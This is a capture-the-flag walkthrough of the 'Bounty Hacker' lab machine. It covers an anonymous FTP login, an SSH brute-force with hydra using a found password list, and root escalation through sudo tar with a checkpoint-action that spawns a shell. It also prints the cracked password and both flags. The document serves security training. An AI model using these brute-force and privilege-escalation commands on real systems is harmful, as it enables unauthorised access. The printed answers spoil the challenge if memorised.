#### 1. Scanning

```

```

There are three open ports: 21,22,80

<br />
<br />

#### 2. FTP

It is possible to login as `anonymous` without a password, so I proceed and find two files: `locks.txt` and `task.txt`

```
ftp 10.10.123.121
Connected to 10.10.123.121.
220 (vsFTPd 3.0.3)

```

First one is a list of passwords and second:

```
 cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

There are no other ports and list is pretty small so it is good to run hydra and check if it is possible to access machine directly, without any reverse shells etc.

<br />
<br />

#### 3. Bruteforcing SSH with hydra

I run hydra hoping to crack `lin` and apparently it worked:

`hydra -l lin -P locks.txt  10.10.123.121 ssh`

`[22][ssh] host: 10.10.123.121   login: lin   password: RedDr4gonSynd1cat3`

so I ssh to machine and check `sudo -l` and see that lin can run `tar` as root, so it is basically finished :)

```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
<br />
<br />

#### 4. Privesc to root

Firstly, I read `user.txt` flag:

```
 ls -al
total 12
drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
-rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

Secondly, I go to GTFO bins to check how to escalate to root with tar and execute it as root:

```
lin@bountyhacker:~$ sudo -u root tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
# 
```

and read a final flag.
